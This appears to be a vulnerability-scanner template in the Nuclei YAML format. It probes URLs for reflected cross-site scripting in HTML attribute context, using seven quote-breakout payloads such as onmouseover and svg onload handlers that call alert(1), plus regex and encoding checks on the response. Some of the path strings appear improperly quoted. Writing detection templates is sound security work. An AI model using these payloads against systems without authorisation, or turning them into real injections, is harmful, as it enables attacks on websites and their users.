id: m7-xss-reflected-attribute
info:
  name: M7 - Reflected XSS in HTML Attribute Context
  author: Sharlix
  severity: high
  description: XSS detection in HTML attribute context (break out of quotes)
  tags: xss,reflected,attribute,m7hunter

requests:
  - method: GET
    path:
      - "{{BaseURL}}?q=m7attr1" onmouseover="alert(1)"
      - "{{BaseURL}}?q=m7attr2' onmouseover='alert(1)"
      - "{{BaseURL}}?q=m7attr3" onfocus="alert(1)" autofocus=""
      - "{{BaseURL}}?q=m7attr4" onload="alert(1)"
      - "{{BaseURL}}?q=m7attr5 onmouseover=alert(1)"
      - "{{BaseURL}}?q=m7attr6"/><svg onload=alert(1)>"
      - "{{BaseURL}}?q=m7attr7"style=animation-name:rotation onanimationstart=alert(1)>"

    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - "m7attr[0-9][^"'<>]*on(mouseover|focus|load|animationstart)=['"]?alert\(1\)"
        part: body

      - type: dsl
        dsl:
          - "!contains(body, '&quot;') && !contains(body, '&#x22;')"
